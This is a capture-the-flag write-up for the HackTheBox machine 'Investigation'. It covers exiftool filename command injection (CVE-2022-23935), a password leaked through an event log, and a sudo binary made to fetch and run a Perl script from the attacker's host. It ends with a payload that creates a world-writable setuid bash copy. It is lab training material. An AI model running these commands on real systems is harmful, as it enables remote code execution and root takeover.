Hackthebox -investigation

Starting with initial Nmap port scan
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
```
Also i did a full port scan 65535 but we can't find anything

## Services
eforenzics.htb
Tech stack 'php' we can see that from upload function which is using upload.php file.
once we upload a jpg file it use exiftool to check images metadata and show the result in a txt file.
check the exiftool for anypublic exploit we found a cve affected verson '12.37'.

##  CVE-2022-23935
Overview

Exiftool versions < 12.38 are vulnerable to Command Injection through a crafted filename. If the filename passed to exiftool ends with a pipe character | and exists on the filesystem, then the file will be treated as a pipe and executed as an OS 
command.

Referance : [https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) 
exploit : [https://github.com/dpbe32/CVE-2022-23935-PoC-Exploit/blob/main/exploit.sh](https://github.com/dpbe32/CVE-2022-23935-PoC-Exploit/blob/main/exploit.sh)

### Got a reverse shell as www-data

found a '.msg' file from /usr/local/investigation
Copied that file to our local machine and extract the content using a command line tool
Tool link : [ https://github.com/TeamMsgExtractor/msg-extractor]( https://github.com/TeamMsgExtractor/msg-extractor)
Using windows event log manager 
we found a logon failer event {eventid 462} which is leaking a password on UserName field
password: Def@ultf0r3nz!csPa$$

## ssh as smorton
smorton:Def@ultf0r3nz!csPa$$

## Privilege escalation
We can run a binary with sudo. Copyiny that binary to my local machine and decompiled it using ghidra.
### what's in the binary
* Checks if the number of command-line arguments passed is equal to 3. If not, it prints "Exiting..." and exits the program with status 0.

* Checks if the current user ID is 0 (root), which indicates that the user is running the program with superuser privileges. If not, it prints "Exiting..." and exits the program with status 0.

* Checks if the third command-line argument is equal to the string "lDnxUysaQn". If not, it prints "Exiting..." and exits the program with status 0.

* If all the above conditions are met, it prints "Running...".

* It then opens the file "lDnxUysaQn" in write binary mode, creates a CURL session, sets several options for the CURL session, including the URL to be downloaded and the file stream to write to.

* It performs the CURL transfer and checks if it was successful. If it was successful, it creates a system command to execute a Perl script with the name "lDnxUysaQn", closes the file stream and the CURL session, and sets the effective user ID back to root. Finally, it removes the file "lDnxUysaQn".

* If the CURL transfer was not successful, it prints "Exiting..." and exits the program with status 0.

What we can do is create a perl file with perl system call and hosted in a python server.
once we run the binary with sudo it's call our file and copy our content to the file and execute our command as root.

```bash
sudo ./binary http://tun0_Ip/shell.pl lDnxUysaQn
```
## payload 
```bash
cp /bin/bash /tmp/elf1337; chmod 4777 /tmp/elf1337
```
